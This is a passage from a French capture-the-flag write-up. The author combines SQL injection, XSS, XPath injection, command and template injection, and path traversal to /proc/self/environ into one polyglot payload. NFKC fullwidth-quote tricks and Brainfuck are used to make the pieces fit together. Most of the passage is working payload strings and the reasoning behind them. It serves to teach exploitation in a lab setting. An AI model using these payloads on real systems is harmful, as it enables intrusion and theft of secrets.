+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Jusqu&rsquo;ici je n&rsquo;ai donc utilisé que des simples quotes, une aubaine pour notre Xpah qui est le seul challenge où les doubles quotes sont absolument nécessaires !
+Et donc, il ne nous posera aucun problème de l&rsquo;ajouter un peu où l&rsquo;on veut. Dans mon cas je l&rsquo;ajoute juste après les injections SQL, il est important que la payload vienne après la 2ème injection sinon les doubles quotes seront interprétées dans celle-ci.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#&#39;</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span> <span class="s">&#34;]|//user[1=1]/password/text()|//user[1=&#34;</span><span class="p">{</span><span class="nf">system</span><span class="p">(</span><span class="err">&#39;</span><span class="n">env</span><span class="err">&#39;</span><span class="p">)}{</span><span class="o">*</span><span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="sc">&#39;1&#39;</span><span class="o">==</span><span class="mi">1</span> <span class="o">%</span><span class="p">}{{[</span><span class="err">&#39;</span><span class="n">env</span><span class="err">&#39;</span><span class="p">]</span><span class="o">|</span><span class="nf">filter</span><span class="p">(</span><span class="err">&#39;</span><span class="n">system</span><span class="err">&#39;</span><span class="p">)}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{{</span><span class="n">lipsum</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">FLAG</span><span class="p">}}</span><span class="o">*</span><span class="p">}</span> <span class="o">&lt;%=</span> <span class="n">ENV</span><span class="p">[</span><span class="err">&#39;</span><span class="n">FLAG</span><span class="err">&#39;</span><span class="p">]</span> <span class="o">%&gt;/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notre payload résoud un challenge de plus.</p>
+<h2 class="heading-element" id="ajouter-les-xss-"><span>Ajouter les XSS ?</span>
+  <a href="#ajouter-les-xss-" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>À ce stade, j&rsquo;ai déjà plus de la moitié des challenges qui passent et pourtant je n&rsquo;ai pas intégré les 2 premiers : les XSS. Mais il y a une bonne raison à cela, c&rsquo;est que ça m&rsquo;a pris un peu de temps à trouver ce que je pouvait faire.</p>
+<p>Dans un premier temps il faut trouver une payload qui fasse fonctionner les 2 XSS ensemble (pas très compliqué), mais ensuite il faut trouver comment les intégrer avec les SQLi, et ça, ça pose problème. Mais pour mieux montrer pourquoi, on va commencer par la 1ère étape.</p>
+<h3 class="heading-element" id="dune-payload-deux-xss"><span>D&rsquo;une payload, deux XSS</span>
+  <a href="#dune-payload-deux-xss" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Comme dit plus haut, l&rsquo;assemblage des 2 XSS n&rsquo;est pas des plus compliqués. On peut par exemple faire ceci 🎃</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">&#39;</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">/*&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Cependant cette payload utilise plusieurs <code>/</code> (donc + 6 caractères dans la Path Traversal). On va donc passer la 1ère XSS en 1 seule balise et inverser l&rsquo;ordre.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">&gt;</span><span class="err">&#39;</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">/*</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>En espérant que cela ne me bloque pas</p>
+<h3 class="heading-element" id="les-sqli"><span>Les SQLi</span>
+  <a href="#les-sqli" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Mince, me voilà bloqué !</p>
+<p>Si je prend à part les 2 injections SQL j&rsquo;ai ceci :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT 1,2,flag FROM flag--&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Si je rajoute la payload des XSS ensuite, j&rsquo;aurais une erreur au niveau de la 2nde XSS, car j&rsquo;aurais au final le code suivant :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="kr">const</span> <span class="nx">x</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span> <span class="nx">UNION</span> <span class="nx">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="nx">flag</span> <span class="nx">FROM</span> <span class="nx">flag</span><span class="o">--</span><span class="s1">&#39; UNION SELECT 1,2,flag FROM flag--&#39;</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;;alert(flag)/*&#39;</span><span class="o">&lt;</span><span class="err">/script&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Et le code javascript n&rsquo;étant pas valide, on aura une erreur. Et en inversant SQLi &amp; XSS, c&rsquo;est au niveau du SQL que l&rsquo;erreur sera présente, notamment avec la 2nde SQLi.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">age</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="n">img</span><span class="w"> </span><span class="n">src</span><span class="o">=</span><span class="n">x</span><span class="w"> </span><span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;;alert(flag)/* UNION SELECT 1,2,flag FROM flag--&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span><span class="c1">--</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>La balise de la 1ère XSS va tout faire sauter.</p>
+<p>Et de la 1ère SQLi</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&lt;img src=x onerror=alert(flag)&gt;&#39;</span><span class="p">;</span><span class="n">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="cm">/*&#39; UNION SELECT 1,2,flag FROM flag--&#39; UNION SELECT 1,2,flag FROM flag--&#39;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>La quote nécessaire pour la 2nde XSS est interprétée par l&rsquo;injection SQL. On peut essayer de faire un sandwich de XSS avec les SQLi de chaque part pour régler ce problème :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flag</span><span class="c1">--&lt;img src=x onerror=alert(flag)&gt;&#39;;alert(flag)/*&#39; UNION SELECT 1,2,flag FROM flag--
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">age</span><span class="w"> </span><span class="o">&lt;</span><span class="s1">&#39; UNION SELECT 1,2,flag FROM flag--&lt;img src=x onerror=alert(flag)&gt;&#39;</span><span class="p">;</span><span class="n">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="cm">/*&#39; UNION SELECT 1,2,flag FROM flag--</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Rien à faire, on aura forcément une erreur quelque part. Il nous manque forcément une pièce du puzzle.
+Revenons à ce que j&rsquo;ai écrit plus haut à propos des challenges SQL.</p>
+<blockquote>
+<p>Nous avons cependant quelques informations en plus :</p>
+<ul>
+<li>La payload n&rsquo;est toujours pas &ldquo;nettoyée&rdquo;</li>
+<li>La DBMS est SQLite3</li>
+<li>La payload est normalisée en NFKC</li>
+</ul></blockquote>
+<p>Que veux dire cette dernière ligne ?</p>
+<h3 class="heading-element" id="le-nfkc"><span>Le NFKC</span>
+  <a href="#le-nfkc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Généralement, lorsqu&rsquo;une information nous est donnée dans un CTF/un challenge, c&rsquo;est quelle est importante. Ici on nous parle de NFKC, qui est une Normalisation Unicode. Ces Normalisation servent à rendre un texte &ldquo;standard&rdquo; en évitant les homoglyphes (caractères qui se ressemblent visuellement mais sont en réalité différents).
+.
+Il transformera donc certains caractères unicodes en des caractères &ldquo;standards&rdquo;.
+Par exemple le caractère <strong>①</strong> deviendra tout simplement <strong>1</strong>.</p>
+<p>Dans notre cas, cela peut nous permettre d&rsquo;avoir des caractères qui seront interprétés par les payloads SQL mais pas par les autres. Et ce qui m&rsquo;intérèsse le plus dans ce cas là, ce sont les quotes.
+Je vais donc faire un petit programme python pour essayer d&rsquo;en trouver</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">unicodedata</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000000</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="ow">not</span> <span class="ow">in</span> <span class="s2">&#34;&#39;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">unicodedata</span><span class="o">.</span><span class="n">normalize</span><span class="p">(</span><span class="s1">&#39;NFKC&#39;</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="ow">in</span> <span class="s2">&#34;&#39;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">i</span><span class="p">,</span><span class="s2">&#34;&gt;&gt;&gt;&#34;</span><span class="p">,</span><span class="n">unicodedata</span><span class="o">.</span><span class="n">normalize</span><span class="p">(</span><span class="s1">&#39;NFKC&#39;</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)))</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>J&rsquo;obtiens 2 caractères : <strong>＂</strong> et <strong>＇</strong>.</p>
+<h3 class="heading-element" id="xss--sqli"><span>XSS + SQLi</span>
+  <a href="#xss--sqli" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Grâce aux caractères obtenus je peux fermer la string de la SQLi sans que cela ferme celle de la XSS 2. La quote unicode ne sera en effet pas interprété par la XSS.</p>
+<p>On peut faire comme suit :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">＇ UNION SELECT 1,2,flag FROM flag--＇ UNION SELECT 1,2,flag FROM flag--;&lt;img src=x onerror=alert(flag)&gt;&#39;;alert(flag)/*</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Avec les 2 premières quote étant en réalité des quote unicode, ce qui donnera pour la XSS 2</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="kr">const</span> <span class="nx">x</span> <span class="o">=</span> <span class="s1">&#39;＇ UNION SELECT 1,2,flag FROM flag--＇ UNION SELECT 1,2,flag FROM flag--;&lt;img src=x onerror=alert(flag)&gt;&#39;</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">)</span><span class="o">/*</span><span class="err">&#39;</span><span class="o">&lt;</span><span class="err">/script&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Si la coloration syntaxique fonctionne bien, on peut voir que toute la partie SQL + 1ère XSS est dans la chaîne de caractère.</p>
+<p>Il ne nous reste qu&rsquo;à fusionner avec notre payload totale :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">＇</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="n">x</span> <span class="n">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">&gt;</span><span class="err">&#39;</span><span class="p">;</span><span class="nf">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="cm">/* &#34;]|//user[1=1]/password/text()|//user[1=&#34;{system(&#39;env&#39;)}{*{% if &#39;1&#39;==1 %}{{[&#39;env&#39;]|filter(&#39;system&#39;)}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}*} &lt;%= ENV[&#39;FLAG&#39;] %&gt;/../../../../../../../proc/self/environ
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 class="heading-element" id="le-brainfuck"><span>Le Brainfuck</span>
+  <a href="#le-brainfuck" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>À ce stade il ne me reste plus que 2 étapes : Le Brainfuck et la XXE. On commence par la payload la plus courte : Le Brainfuck.
+Pour être sûr qu&rsquo;il n&rsquo;y ai aucun problème de syntaxe, mon idée est de mettre la payload brainfuck au tout début. En effet tant que le code du début est executé, la suite le sera aussi.</p>
+<p>Comment mettre le brainfuck au tout début sans bloquer le SQL ? En abusant encore du NFKC.
+On va utiliser les fausse double quote <strong>＂</strong> qui n&rsquo;interfererons pas avec la 1ère SQLi, ouvrirons une string dans la 2nde et surtout ne bloquerons pas la xpath (qui ne les interpretera pas non plus).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">＂</span><span class="p">[.</span><span class="o">&gt;</span><span class="p">],[.,]</span><span class="err">＇</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#＂</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="n">x</span> <span class="n">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">&gt;</span><span class="err">&#39;</span><span class="p">;</span><span class="nf">alert</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="cm">/* &#34;]|//user[1=1]/password/text()|//user[1=&#34;{system(&#39;env&#39;)}{*{% if &#39;1&#39;==1 %}{{[&#39;env&#39;]|filter(&#39;system&#39;)}}{% endif %}{{lipsum.__globals__.os.environ.FLAG}}*} &lt;%= ENV[&#39;FLAG&#39;] %&gt;/../../../../../../proc/self/environ
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Petit problème cependant, la syntaxe est incorrecte. Certaines boucles ne sont pas fermée, d&rsquo;autre fermées sans être ouverte. à ce stade la payload brainfuck, une fois nettoyée ressemble à ceci :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-brainfuck" data-lang="brainfuck"><span class="line"><span class="cl"><span class="k">[</span><span class="nt">.</span><span class="nv">&gt;</span><span class="k">]</span><span class="nt">,</span><span class="k">[</span><span class="nt">.,</span><span class="k">]</span><span class="nt">,,,,</span><span class="nv">&lt;&gt;</span><span class="err">]</span><span class="k">[][[]</span><span class="nt">....</span><span class="nv">&lt;</span><span class="k">[]</span><span class="nv">&gt;</span><span class="nt">....</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>On va donc chercher à corriger tout cela en ouvrant une bracket juste après notre brainfuck et en en fermant une autre juste après notre xpath, normalement cela devrait être réglé.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">＂</span><span class="p">[.</span><span class="o">&gt;</span><span class="p">],[.,][</span><span class="err">＇</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="n">env</span><span class="p">;</span><span class="err">#＂</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">flag</span> <span class="n">FROM</span> <span class="n">flag</span><span class="o">--</span><span class="p">;</span><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span 